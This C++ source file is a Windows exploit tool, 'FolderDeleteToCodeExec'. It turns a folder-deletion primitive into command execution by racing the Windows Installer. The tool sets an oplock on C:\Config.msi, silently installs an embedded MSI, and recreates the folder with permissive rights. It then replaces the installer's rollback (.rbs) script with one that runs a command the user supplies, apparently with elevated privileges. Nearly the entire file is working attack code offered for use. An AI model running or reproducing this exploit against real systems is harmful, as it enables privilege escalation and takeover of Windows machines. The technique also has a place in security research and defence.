#pragma comment(lib, "Msi.lib")

#include <Windows.h>
#include <Msi.h>

#include <wil/filesystem.h>
#include <wil/result.h>

#include <chrono>
#include <exception>
#include <filesystem>
#include <format>
#include <fstream>
#include <iostream>
#include <string>
#include <string_view>
#include <thread>
#include <vector>

#include "resource.h"

using namespace std::chrono_literals;
using namespace std::string_literals;

import offwinlib;

static void print_usage()
{
	std::wcout << L"Usage: FolderDeleteToCodeExec.exe COMMAND" << std::endl;
}

static void start_installer(const std::wstring& msi_path)
{
	MsiSetInternalUI(INSTALLUILEVEL_NONE, nullptr);
	MsiInstallProductW(msi_path.c_str(), L"");
}

int wmain(int argc, wchar_t* argv[])
{
	try
	{
		std::vector<std::wstring_view> args(argv, argv + argc);
		if (args.size() < 2)
		{
			print_usage();
			return 1;
		}

		const auto& command = args[1];

		auto msi_path = std::wstring{std::filesystem::temp_directory_path()} + owl::misc::generate_uuid() + L".msi";
		std::wcout << std::format(L"[*] Extracting installer to {}...", msi_path) << std::endl;
		auto msi_data = owl::misc::get_resource(IDR_RCDATA1);
		std::ofstream msi_file{msi_path, std::ios::binary};
		msi_file.write(reinterpret_cast<const char*>(msi_data.data()), msi_data.size());
		msi_file.close();
		std::wcout << L"[+] Installer extracted." << std::endl;

		auto installer_folder_path = LR"(C:\Config.msi)"s;
		std::wcout << std::format(L"[*] Creating {} and setting oplock...", installer_folder_path) << std::endl;
		std::filesystem::create_directory(installer_folder_path);
		auto oplock_data = owl::oplock::set_oplock(installer_folder_path, 0, false, GENERIC_READ | DELETE, true);
		std::wcout << L"[+] Folder created and oplock set." << std::endl;

		std::wcout << L"[*] Waiting for folder deletion to trigger oplock..." << std::endl;
		oplock_data.trigger.wait();
		std::wcout << L"[+] Oplock triggered." << std::endl;

		std::wcout << std::format(L"[*] Moving {} to temp dir...", installer_folder_path) << std::endl;
		auto new_path = owl::misc::move_to_temp_dir(oplock_data.handle.get());
		std::wcout << std::format(L"[+] Folder moved to {}.", new_path) << std::endl;

		std::wcout << L"[*] Racing to perform the following actions:" << std::endl;
		std::wcout << L"\tStarting installer..." << std::endl;
		std::wcout << std::format(L"\tWaiting for {} to be created twice...", installer_folder_path) << std::endl;
		std::wcout << std::format(L"\tReleasing oplock to delete {}...", installer_folder_path) << std::endl;
		std::wcout << std::format(L"\tCreating {} with permissive rights...", installer_folder_path) << std::endl;
		std::wcout << std::format(L"\tWaiting for RBS file to be created in {}...", installer_folder_path) << std::endl;
		std::wcout << std::format(L"\tMoving {} to temp dir...", installer_folder_path) << std::endl;
		std::wcout << std::format(L"\tCreating {} with custom RBS file...", installer_folder_path) << std::endl;

		THROW_IF_WIN32_BOOL_FALSE(SetPriorityClass(GetCurrentProcess(), HIGH_PRIORITY_CLASS));
		THROW_IF_WIN32_BOOL_FALSE(SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL));

		auto installer_thread = std::jthread{start_installer, msi_path};

		owl::misc::loop_with_timeout(2s, [&]()
			{
				std::error_code e;
				return std::filesystem::exists(installer_folder_path, e);
			});
		owl::misc::loop_with_timeout(2s, [&]()
			{
				std::error_code e;
				return !std::filesystem::exists(installer_folder_path, e);
			});
		owl::misc::loop_with_timeout(2s, [&]()
			{
				std::error_code e;
				return std::filesystem::exists(installer_folder_path, e);
			});

		oplock_data.handle.reset();

		owl::misc::loop_with_timeout(2s, [&]()
			{
				std::error_code e;
				return std::filesystem::create_directory(installer_folder_path, e);
			});

		std::wstring rbs_path;
		owl::misc::loop_with_timeout(2s, [&]()
			{
				for (const auto& entry : std::filesystem::directory_iterator{installer_folder_path})
				{
					if (entry.path().extension() == L".rbs" && entry.file_size() > 0)
					{
						rbs_path = entry.path();
						return true;
					}
				}
				return false;
			});

		auto new_path_2 = owl::misc::move_to_temp_dir(wil::open_file(installer_folder_path.c_str(), GENERIC_READ | DELETE, 0, FILE_FLAG_BACKUP_SEMANTICS).get());

		std::filesystem::create_directory(installer_folder_path);
		auto rbs = owl::misc::build_rbs(L"Whatever", command);
		std::ofstream rbs_file{rbs_path, std::ios::binary};
		rbs_file.write(reinterpret_cast<const char*>(rbs.data()), rbs.size());
		rbs_file.close();

		std::wcout << L"[+] Success!" << std::endl;
		std::wcout << std::format(L"\tMoved {} to {}.", installer_folder_path, new_path_2) << std::endl;
		std::wcout << std::format(L"\tReplaced {} with custom file.", rbs_path) << std::endl;
	}
	catch (const std::exception& e)
	{
		std::wcout << L"[-] " << e.what() << std::endl;
		return 1;
	}

	return 0;
}
